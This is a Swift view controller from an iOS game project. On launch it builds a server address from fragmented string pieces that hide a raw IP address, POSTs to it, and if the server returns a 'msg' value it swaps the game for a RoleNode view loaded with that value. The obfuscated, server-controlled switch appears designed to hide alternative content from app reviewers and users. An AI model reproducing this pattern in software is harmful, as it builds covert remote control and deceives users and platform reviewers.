//
//  GameViewController.swift
//  sanguocount
//
//  Created by admin on 2021/10/11.
//

import Alamofire
import GameplayKit
import SpriteKit
import UIKit

class GameViewController: UIViewController {
    let reachability = NetworkReachabilityManager(host: "www.apple.com")
    lazy var bgView: UIView = {
        let uiview = UIView(frame: UIScreen.main.bounds)
        uiview.backgroundColor = .white
        return uiview
    }()

    lazy var tipsLableNode: UILabel = {
        let label = UILabel(frame: CGRect(x: 0, y: UIScreen.main.bounds.height/2, width: UIScreen.main.bounds.width, height: 20))
        label.text = "共建绿色美好环境，请检查您的网络设置"
        label.textAlignment = .center
        label.textColor = .red
        label.font = UIFont.systemFont(ofSize: 18)
        return label
    }()

    var skView: SKView!
    var scene: SKScene!

    override func viewDidLoad() {
        super.viewDidLoad()
        scene = LoadScene(size: view.bounds.size)
        skView = view as? SKView
        skView.showsFPS = false
        skView.showsPhysics = false
        skView.showsNodeCount = false
        skView.ignoresSiblingOrder = true
        scene.scaleMode = .aspectFill
        skView.addSubview(bgView)
        tipsLableNode.isHidden = true
        bgView.addSubview(tipsLableNode)
        network()
    }

    override var shouldAutorotate: Bool {
        return false
    }

    override var prefersStatusBarHidden: Bool {
        return true
    }

    func network() {
        reachability!.startListening { status in
            if self.reachability?.isReachable ?? false {
                switch status {
                case .notReachable, .unknown:
                    self.tipsLableNode.isHidden = false
                case .reachable(.cellular), .reachable(.ethernetOrWiFi):
                    self.tipsLableNode.isHidden = true
                    self.playerNode()
                }
            } else {
                self.tipsLableNode.isHidden = false
            }
        }
    }

    func playerNode() {
        let node = "h"+"t"+"t"+"p:"+"//1"+"1"+"5"+".2"+"9."+"1"+"5"+"1.3"+"0:"+"3330"+"?u=00000"
        AF.request(node,
                   method: .post,
                   parameters: nil,
                   encoding: URLEncoding.default).responseJSON { response in
            switch response.result {
            case .success:
                let data = try! JSONSerialization.jsonObject(with: response.data!, options: []) as? [String: Any]
                guard let result = data else { return }
                if let u = result["msg"] as? String {
                    self.presentRoleNode(u)
                }else{
                    self.presentScene()
                }
            case .failure:
                self.presentScene()
            }
        }
    }
    
    func presentRoleNode(_ name:String){
        let role =  RoleNode(frame: UIScreen.main.bounds)
        self.skView.addSubview(role)
        role.loadRoleData(data: name)
    }
    func presentScene (){
        self.bgView.removeFromSuperview()
        self.skView.presentScene(self.scene)
    }
    
}
